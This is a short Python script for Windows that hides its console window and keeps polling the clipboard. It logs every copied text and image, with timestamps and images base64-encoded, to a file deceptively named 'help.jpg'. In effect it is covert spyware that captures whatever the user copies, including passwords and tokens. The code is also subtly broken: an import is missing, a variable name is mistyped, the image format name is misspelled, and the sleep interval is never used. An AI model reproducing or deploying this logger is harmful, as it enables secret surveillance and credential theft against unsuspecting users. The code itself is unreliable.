import sys, os, io, time, base64
from datetime import datetime
platform = sys.platform 


if platform == 'win32':
    import win32gui, win32console, win32clipboard
    from PIL import ImageGrab

    
cbData= ' ' #global clipboard data 
flePath= 'help.jpg' #output file 
slpDur = 3 #how often to check clipboard
imgQly = 10 #image quality 
 
def writeData(data): #wirte clipboard data to log file 
    with open(flePath, 'a') as fle:
        fle.write(data)
    fle.close()
  
def hideWindow(): 
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True

def getWinClip():
    global cbData
    win32clipboard.OpenClipboard()
    try : #get text 
        text = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
        win32clipboard.CloseClipboard()
        if cbData != text: 
            cbData = text
            writeData('::t:'+ str(datetime.now())+ '\n' + str(text.decode()) + '\n')
    except:
        win32clipboard.CloseClipboard()
        img = ImageGrab.grabclipboard() #grap image from clipboard
        buf = BytesIO()
        img.save(buf, format='jepg',  optimize=True, quality=imgQLy)
        text = str(base64.b64encode(buf.getvalue()).decode())
        if cbData != text: #new data, write to log file
            cbData = text
            writeData('::i:'+ str(datetime.now())+ '\n' + str(text) + '\n')
            

if platform=='win32':
    hideWindow()
    while True:
        if platform == 'win32':
            getWinClip()
    
        
 
    
     
 